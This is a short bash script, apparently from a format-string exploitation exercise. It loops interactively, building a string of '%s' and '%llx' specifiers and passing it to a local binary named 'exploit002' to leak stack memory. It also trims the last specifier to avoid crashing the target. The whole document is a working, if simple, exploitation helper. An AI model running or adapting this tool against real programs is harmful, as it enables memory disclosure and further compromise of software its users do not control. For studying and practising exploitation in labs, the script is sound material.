#!/bin/bash
 
string="%s"
stop=1
 
while [ $stop != 0 ]; do
    
    echo $string
    echo "String :"
    ./exploit002 $string
    echo "
======================
    1 : Print %s
    2 : Print %llx
    3 : Delete last %format
    0 : Exit
======================"
    read stop
    if [ $stop = 1 ]; then
        string=$string--%s
    else
        if [ $stop = 2 ]; then
            string=$string--%llx
        else
        # Delete the last the format code (to avoid segfault)
            if [ $stop = 3 ]; then
                i=$((${#string}-1))
                # If the last character is ‘s’ → different size of string
                if [ ${string:$i:1} = "s" ]; then
                    string=${string::-4} # Remove “--%s”
                else
                    string=${string::-6} # Remove “--%llx”
                fi
            else
                stop=0
            fi
        fi
    fi
done